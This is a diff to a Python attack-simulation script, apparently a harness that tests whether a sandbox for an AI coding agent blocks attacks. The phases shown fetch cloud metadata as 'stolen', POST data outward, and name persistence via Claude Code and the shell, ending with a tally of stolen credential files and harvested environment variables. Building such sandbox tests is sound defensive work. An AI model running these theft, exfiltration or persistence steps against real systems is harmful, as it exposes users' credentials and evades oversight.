@@ -109,15 +109,13 @@ def run():
                 body = resp.read().decode()[:200]
                 print(f"{_dots(name)} STOLEN ({len(body)} B)")
                 stolen_metadata[name] = body
-        except Exception as e:
-            msg = str(e)
-            if "link-local" in msg.lower():
+        except OSError as e:
+            errno = getattr(e, "errno", None) or getattr(getattr(e, "reason", None), "errno", None)
+            if errno == 5:
                 print(f"{_dots(name)} BLOCKED (link-local policy)")
-            elif "Input/output error" in msg:
-                print(f"{_dots(name)} BLOCKED (link-local policy)")
-            elif "timed out" in msg or "timeout" in msg.lower():
+            elif isinstance(e, socket.timeout):
                 print(f"{_dots(name)} TIMEOUT (no metadata service)")
-            elif "refused" in msg.lower():
+            elif errno == 111:
                 print(f"{_dots(name)} NOT AVAILABLE")
             else:
                 print(f"{_dots(name)} BLOCKED")
@@ -173,20 +171,20 @@ def run():
         req.add_header("Content-Type", "application/json")
         with urlopen(req, timeout=5) as resp:
             print(f"  status: SENT (HTTP {resp.status})")
-    except Exception as e:
-        msg = str(e)
-        if "Network is unreachable" in msg:
-            print("  status: BLOCKED -- Network is unreachable")
-        elif "Input/output error" in msg:
+    except OSError as e:
+        errno = getattr(e, "errno", None) or getattr(getattr(e, "reason", None), "errno", None)
+        if errno == 5:
             print("  status: BLOCKED -- Connection denied (loopback policy)")
-        elif "Connection refused" in msg:
+        elif errno == 101:
+            print("  status: BLOCKED -- Network is unreachable")
+        elif errno == 111:
             print("  status: BLOCKED -- Connection refused")
-        elif "timed out" in msg:
+        elif isinstance(e, socket.timeout):
             print("  status: BLOCKED -- Connection timed out")
-        elif "nodename nor servname" in msg or "Name or service not known" in msg:
+        elif errno == -2 or errno == -3:
             print("  status: BLOCKED -- DNS resolution failed")
         else:
-            print(f"  status: BLOCKED -- {msg}")
+            print(f"  status: BLOCKED -- {e}")
 
     # ── Phase 5: Persistence ─────────────────────────────────────────
     _header("Phase 5: Persistence (Claude Code + shell)")
@@ -281,7 +279,7 @@ def run():
 
     print()
     print("=" * (W + 2))
-    if n_files > 0 or n_env > 0:
+    if n_files > 0 or n_env > 0 or n_meta > 0:
         print("  RESULT: Attack SUCCEEDED")
         print(f"    {n_files} credential file(s) stolen")
         print(f"    {n_env} environment variable(s) harvested")
